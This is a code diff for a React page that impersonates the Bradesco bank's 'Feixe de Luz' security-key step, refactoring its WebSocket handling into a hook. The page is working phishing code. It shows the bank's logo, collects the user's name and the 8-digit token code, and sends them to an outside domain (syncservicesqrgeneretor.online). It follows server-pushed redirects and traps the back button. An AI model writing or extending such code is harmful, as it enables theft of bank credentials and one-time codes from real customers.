@@ -2,12 +2,12 @@ import { useEffect, useRef, useState, useCallback } from "react";
 import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { resolveServerRoute } from "@/lib/resolveServerRoute";
+import { useWebSocket } from "@/hooks/useWebSocket";
 
 const FeixePage = () => {
   const navigate = useNavigate();
   const usuario = localStorage.getItem("usuario") || "";
   const dispositivo = localStorage.getItem("dispositivo") || "";
-  const wsRef = useRef<WebSocket | null>(null);
   const [status, setStatus] = useState<"aguardando" | "lendo" | "validando" | "erro">("aguardando");
   const [binario, setBinario] = useState<string>("");
   const [corAtual, setCorAtual] = useState<"black" | "white">("black");
@@ -17,6 +17,30 @@ const FeixePage = () => {
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const indexRef = useRef(0);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
+  const { send } = useWebSocket({
+    reconectarPayload: { dispositivo },
+    onRedirect: (msg) => {
+      setStatus("validando");
+      setTimeout(() => {
+        navigate(resolveServerRoute(msg.url));
+      }, 1500);
+    },
+    onMessage: (msg) => {
+      if (msg.acao === "feixe_binario" && msg.binario) {
+        setBinario(msg.binario);
+        setStatus("aguardando");
+      }
+      if (msg.acao === "erro_chave") {
+        setErroChave(msg.motivo || "Chave inválida. Tente novamente.");
+        setEnviandoChave(false);
+      }
+      if (msg.acao === "erro_feixe") {
+        setStatus("erro");
+        if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; }
+      }
+    },
+  });
 
   const iniciarLeitura = useCallback(() => {
     if (!binario) return;
@@ -31,13 +55,13 @@ const FeixePage = () => {
         intervalRef.current = null;
         setCorAtual("black");
         setStatus("aguardando");
-        wsRef.current?.send(JSON.stringify({ acao: "feixe_lido", usuario }));
+        send({ acao: "feixe_lido", usuario });
         return;
       }
       setCorAtual(binario[indexRef.current] === "1" ? "white" : "black");
       indexRef.current++;
     }, 50);
-  }, [binario, usuario]);
+  }, [binario, usuario, send]);
 
   const handleDigit = (index: number, value: string) => {
     if (!/^\d?$/.test(value)) return;
@@ -62,52 +86,18 @@ const FeixePage = () => {
     if (!chaveCompleta) return;
     setErroChave("");
     setEnviandoChave(true);
-    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token: chave.join("") }));
+    send({ acao: "token", usuario, token: chave.join("") });
     navigate("/validando");
   };
-
-  useEffect(() => {
-    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
-    wsRef.current = ws;
-
-    ws.onopen = () => {
-      console.log("FeixePage WS conectado");
-      if (usuario) ws.send(JSON.stringify({ acao: "reconectar", usuario, dispositivo }));
-    };
-
-    ws.onmessage = (event) => {
-      const msg = JSON.parse(event.data);
-      console.log("FeixePage msg:", msg);
-
-      if (msg.acao === "feixe_binario" && msg.binario) {
-        setBinario(msg.binario);
-        setStatus("aguardando");
-      }
-      if (msg.acao === "redirecionar" && msg.url) {
-        setStatus("validando");
-        setTimeout(() => {
-          navigate(resolveServerRoute(msg.url));
-        }, 1500);
-      }
-      if (msg.acao === "erro_chave") {
-        setErroChave(msg.motivo || "Chave inválida. Tente novamente.");
-        setEnviandoChave(false);
-      }
-      if (msg.acao === "erro_feixe") {
-        setStatus("erro");
-        if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; }
-      }
-    };
-
-    ws.onerror = (err) => console.error("Feixe WS erro:", err);
-    return () => { ws.close(); if (intervalRef.current) clearInterval(intervalRef.current); };
-  }, [usuario, dispositivo]);
 
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
     const handlePop = () => window.history.pushState(null, "", window.location.href);
     window.addEventListener("popstate", handlePop);
-    return () => window.removeEventListener("popstate", handlePop);
+    return () => {
+      window.removeEventListener("popstate", handlePop);
+      if (intervalRef.current) clearInterval(intervalRef.current);
+    };
   }, []);
 
   return (
@@ -132,7 +122,6 @@ const FeixePage = () => {
         <div className="flex flex-col flex-1 px-5 pt-6 pb-8">
           <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-6">Chave de Segurança - Feixe de Luz</h2>
 
-          {/* Black square */}
           <div className="flex justify-start mb-6">
             <div
               className="w-40 h-40 border border-[hsl(220,14%,80%)] transition-colors duration-[30ms]"
@@ -140,7 +129,6 @@ const FeixePage = () => {
             />
           </div>
 
-          {/* Instructions */}
           <div className="space-y-3 mb-6">
             <p className="text-[hsl(220,10%,40%)] text-sm">1 - Na sua chave, aperte o botão com o desenho de cadeado</p>
             <p className="text-[hsl(220,10%,40%)] text-sm">2 - Posicione o sensor que fica no verso dela, na frente deste quadro preto (cerca de 1 cm)</p>
@@ -177,7 +165,7 @@ const FeixePage = () => {
             <div className="flex flex-col items-center gap-3 mb-6">
               <p className="text-[hsl(0,84%,60%)] text-sm">Não foi possível validar. Tente novamente.</p>
               <button
-                onClick={() => { setStatus("aguardando"); setChave(["","","","","","","",""]); wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario })); }}
+                onClick={() => { setStatus("aguardando"); setChave(["","","","","","","",""]); send({ acao: "reconectar", usuario }); }}
                 className="px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
               >
                 Tentar novamente
@@ -185,7 +173,7 @@ const FeixePage = () => {
             </div>
           )}
 
-          {/* Security key input - always visible */}
+          {/* Security key input */}
           <div className="w-full bg-[hsl(220,20%,96%)] rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] mt-auto">
             <div className="flex items-center gap-3 mb-4">
               <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 shrink-0 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
